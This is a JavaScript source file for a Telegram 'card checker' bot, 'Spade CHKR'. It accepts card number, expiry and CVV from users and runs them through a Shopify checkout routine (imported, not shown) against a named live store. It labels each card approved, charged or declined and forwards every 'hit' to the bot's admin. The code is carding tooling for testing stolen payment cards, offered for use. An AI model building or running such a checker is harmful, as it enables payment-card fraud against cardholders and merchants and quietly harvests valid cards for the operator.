require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const { checkCard } = require("./shopify");

// ==========================================
// CONFIG — CHANGE HERE
// ==========================================
const BOT_TOKEN = process.env.BOT_TOKEN || "YOUR_BOT_TOKEN_HERE";
const ADMIN_ID  = parseInt(process.env.ADMIN_ID || "0");
const BOT_NAME  = process.env.BOT_NAME  || "Spade CHKR";
// ==========================================

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.get("/", (req, res) => res.send(BOT_NAME + " is running!"));
app.listen(process.env.PORT || 3000, "0.0.0.0", () => {
  console.log("[SERVER] Started on port " + (process.env.PORT || 3000));
});

function escapeHTML(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// Active checks
const activeChecks = new Set();

// Default store
let shopifyStore = "https://mokobara.com";

// =================== KEYBOARDS ===================
function getResultKeyboard(category) {
  if (category === "approved") {
    return { inline_keyboard: [[{ text: "✅ APPROVED", callback_data: "noop" }]] };
  } else if (category === "charged") {
    return { inline_keyboard: [[{ text: "💙 CHARGED", callback_data: "noop" }]] };
  }
  return { inline_keyboard: [[{ text: "🔴 DECLINED", callback_data: "noop" }]] };
}

// =================== FORMAT RESULT ===================
function formatResult(ccInput, result, userName, userId) {
  const si = (result.category === "approved" || result.category === "charged")
    ? "<tg-emoji emoji-id=\"6138803821394009204\">✅</tg-emoji>"
    : "<tg-emoji emoji-id=\"5402104393396931859\">❌</tg-emoji>";

  const statusText =
    result.category === "approved" ? "APPROVED ✅" :
    result.category === "charged"  ? "CHARGED 💳" :
    "DECLINED ❌";

  return (
    si + " <b>Status</b> ➠ " + statusText + "\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card</b> ➠ <code>" + escapeHTML(ccInput) + "</code>\n" +
    "<tg-emoji emoji-id=\"6136204644625423818\">⚡</tg-emoji> <b>Gateway</b> ➠ Shopify " + (result.product ? "$" + result.product.price : "1$") + "\n" +
    "<tg-emoji emoji-id=\"6138961691506907344\">⚙️</tg-emoji> <b>Response</b> ➠ " + escapeHTML(result.response) + "\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"6159080241739342919\">🏦</tg-emoji> <b>Brand</b> ➠ " + escapeHTML(result.binInfo.brand) + "\n" +
    "<tg-emoji emoji-id=\"6159080241739342919\">🏛</tg-emoji> <b>Issuer</b> ➠ " + escapeHTML(result.binInfo.issuer) + "\n" +
    "<tg-emoji emoji-id=\"4956560549287560231\">🌍</tg-emoji> <b>Country</b> ➠ " + escapeHTML(result.binInfo.country) + " " + (result.binInfo.flag || "") + "\n" +
    "━━━━━━━━━━━━━━━\n" +
    "⏱ <b>Time</b> ➠ " + result.timeTaken + "s\n" +
    "<tg-emoji emoji-id=\"4956461073550017373\">👤</tg-emoji> <b>User</b> ➠ <a href=\"tg://user?id=" + userId + "\">" + escapeHTML(userName || "User") + "</a>\n" +
    "<tg-emoji emoji-id=\"4956420911310832630\">💎</tg-emoji> <b>Dev</b> ➠ @ZeroSpade"
  );
}

// =================== /start ===================
bot.onText(/^\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = chatId === ADMIN_ID;

  if (isAdmin) {
    return bot.sendMessage(chatId,
      "<tg-emoji emoji-id=\"5215399540814781035\">👑</tg-emoji> <b>ADMIN PANEL</b>\n" +
      "━━━━━━━━━━━━━━━\n" +
      "Welcome back, Developer!\n" +
      "━━━━━━━━━━━━━━━\n" +
      "<tg-emoji emoji-id=\"6138961691506907344\">⚙️</tg-emoji> <b>Admin Commands:</b>\n" +
      "/setstore <code>url</code> — Set store\n" +
      "/store — View current store\n" +
      "/sh <code>cc|mm|yy|cvv</code> — Check card",
      {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [
          [{ text: "🔍 Check Card", callback_data: "how_to_check" }],
          [{ text: "🏪 Current Store", callback_data: "show_store" }],
        ]}
      }
    );
  }

  bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"6138869285285537620\">♠️</tg-emoji> <b>WELCOME TO " + escapeHTML(BOT_NAME) + "</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"6138532229137049159\">🔥</tg-emoji> WHERE LEGENDS BURN THROUGH FIRE\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"6138961691506907344\">⚙️</tg-emoji> <b>Commands:</b>\n" +
    "/sh <code>cc|mm|yy|cvv</code> — Check card\n" +
    "/store — Current store info\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"4956420911310832630\">💎</tg-emoji> Dev: @ZeroSpade",
    { parse_mode: "HTML" }
  );
});

// =================== /store ===================
bot.onText(/^\/store/, (msg) => {
  bot.sendMessage(msg.chat.id,
    "<tg-emoji emoji-id=\"6138961691506907344\">⚙️</tg-emoji> <b>Current Store:</b>\n" +
    "<code>" + escapeHTML(shopifyStore) + "</code>",
    { parse_mode: "HTML" }
  );
});

// =================== /setstore ===================
bot.onText(/^\/setstore (.+)/, (msg, match) => {
  if (msg.chat.id !== ADMIN_ID) {
    return bot.sendMessage(msg.chat.id, "❌ Admin only command!");
  }
  let url = match[1].trim();
  if (!url.startsWith("http")) url = "https://" + url;
  shopifyStore = url;
  bot.sendMessage(msg.chat.id,
    "<tg-emoji emoji-id=\"6138803821394009204\">✅</tg-emoji> <b>Store Updated!</b>\n" +
    "<code>" + escapeHTML(url) + "</code>",
    { parse_mode: "HTML" }
  );
});

// =================== /sh — MAIN CHECK ===================
bot.onText(/^\/sh(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userName = msg.from.first_name || "User";
  const userId = msg.from.id;

  // Format check
  if (!match || !match[1]) {
    return bot.sendMessage(chatId,
      "<tg-emoji emoji-id=\"5402104393396931859\">⚠️</tg-emoji> <b>Format:</b>\n" +
      "<code>/sh cc|mm|yy|cvv</code>\n\n" +
      "<i>Example:\n/sh 4111111111111111|01|26|123</i>",
      { parse_mode: "HTML" }
    );
  }

  // Prevent duplicate
  if (activeChecks.has(chatId)) {
    return bot.sendMessage(chatId,
      "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> Previous check still running!\nPlease wait...",
      { parse_mode: "HTML" }
    );
  }

  activeChecks.add(chatId);
  const ccInput = match[1].trim();

  // Initial message
  const pm = await bot.sendMessage(chatId,
    "<tg-emoji emoji-id=\"5213452215527677338\">⏳</tg-emoji> <b>Initializing checker...</b>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "<tg-emoji emoji-id=\"5195072744798051557\">💳</tg-emoji> <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n" +
    "━━━━━━━━━━━━━━━\n" +
    "⬜⬜⬜⬜⬜⬜",
    { parse_mode: "HTML" }
  );

  try {
    // Live step updates
    const onStep = async (text) => {
      try {
        await bot.editMessageText(text, {
          chat_id: chatId,
          message_id: pm.message_id,
          parse_mode: "HTML"
        });
        await new Promise(r => setTimeout(r, 700));
      } catch(e) {}
    };

    // Run check — pass bot + chatId for screenshots
    const result = await checkCard(ccInput, shopifyStore, onStep, bot, chatId);

    // Final result message
    const finalMsg = formatResult(ccInput, result, userName, userId);
    const keyboard = getResultKeyboard(result.category);

    await bot.editMessageText(finalMsg, {
      chat_id: chatId,
      message_id: pm.message_id,
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: keyboard
    });

    // Notify admin on hit
    if (
      (result.category === "approved" || result.category === "charged") &&
      chatId !== ADMIN_ID
    ) {
      bot.sendMessage(ADMIN_ID,
        "🟢 <b>HIT FOUND!</b>\n" +
        "👤 By: <a href=\"tg://user?id=" + userId + "\">" + escapeHTML(userName) + "</a>\n" +
        "━━━━━━━━━━━━━━━\n" + finalMsg,
        { parse_mode: "HTML", disable_web_page_preview: true }
      );
    }

  } catch(err) {
    console.error("[CHECK ERROR]", err.message);
    try {
      await bot.editMessageText(
        "<tg-emoji emoji-id=\"5402104393396931859\">❌</tg-emoji> <b>Error!</b>\n" +
        "<code>" + escapeHTML(err.message) + "</code>",
        { chat_id: chatId, message_id: pm.message_id, parse_mode: "HTML" }
      );
    } catch(e) {}
  } finally {
    activeChecks.delete(chatId);
  }
});

// =================== CALLBACKS ===================
bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id;

  if (cb.data === "noop") {
    return bot.answerCallbackQuery(cb.id).catch(() => {});
  }

  if (cb.data === "how_to_check") {
    bot.sendMessage(chatId,
      "<tg-emoji emoji-id=\"6138961691506907344\">⚙️</tg-emoji> <b>How to check:</b>\n" +
      "<code>/sh 4111111111111111|01|26|123</code>",
      { parse_mode: "HTML" }
    );
  }

  if (cb.data === "show_store") {
    bot.sendMessage(chatId,
      "<tg-emoji emoji-id=\"6138961691506907344\">⚙️</tg-emoji> <b>Current Store:</b>\n" +
      "<code>" + escapeHTML(shopifyStore) + "</code>",
      { parse_mode: "HTML" }
    );
  }

  bot.answerCallbackQuery(cb.id).catch(() => {});
});

// =================== ERROR HANDLERS ===================
process.on("uncaughtException", err => {
  console.error("[UNCAUGHT]", err.message);
});
process.on("unhandledRejection", r => {
  console.error("[REJECTION]", r);
});

console.log("[BOT] " + BOT_NAME + " started!");
